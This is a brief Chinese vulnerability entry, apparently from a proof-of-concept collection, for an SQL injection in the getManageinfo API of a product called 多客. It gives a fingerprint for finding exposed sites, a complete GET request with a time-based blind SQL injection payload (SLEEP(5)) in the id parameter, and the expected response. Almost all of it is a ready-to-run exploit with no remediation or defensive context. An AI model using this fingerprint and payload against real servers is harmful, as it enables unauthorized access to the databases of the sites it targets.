# 多客getManageinfo存在SQL注入漏洞

多客 ｜ SQL注入 ｜ —
- **指纹**：`body="/static/index/js/jweixin-1.2.0.js"`
- **请求**：`GET /api/index/quanManageList/getManageinfo?id=1%29+AND+%28SELECT+8888+FROM+%28SELECT%28SLEEP%285%29%29%29qBqH%29+AND+%288888%3D888 HTTP/1.1`
- **响应特征**：200